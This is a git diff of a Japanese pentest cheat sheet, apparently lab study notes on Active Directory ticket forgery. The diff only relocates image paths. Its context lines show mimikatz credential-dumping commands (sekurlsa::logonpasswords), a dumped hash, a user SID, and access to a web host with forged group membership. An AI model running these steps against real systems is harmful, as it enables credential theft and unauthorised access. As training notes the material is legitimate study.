@@ -30,7 +30,7 @@ iwr : Server Error
 privilege::debug
 sekurlsa::logonpasswords
 ```
-![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502090042.png)
+![](../../../assets/images/Pasted%20image%2020260502090042.png)
 ```
 4d28cf5252d39971419580a51484ca09
 ```
@@ -39,7 +39,7 @@ sekurlsa::logonpasswords
 ```powershell
 whoami /user
 ```
-![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502090051.png)
+![](../../../assets/images/Pasted%20image%2020260502090051.png)
 ```
 S-1-5-21-1987370270-658905905-1781884369-1105
 ```
@@ -70,13 +70,13 @@ Group IDを確認すると強力なグループのメンバーに偽装されて
 ```powershell
 klist
 ```
-![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502090846.png)
+![](../../../assets/images/Pasted%20image%2020260502090846.png)
 
 # 現在のユーザがWebサイトにアクセスできるかの再確認
 ```powershell
 iwr -UseDefaultCredentials http://web04
 ```
-![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502090854.png)
+![](../../../assets/images/Pasted%20image%2020260502090854.png)
 
 ## Lab
 ```powershell
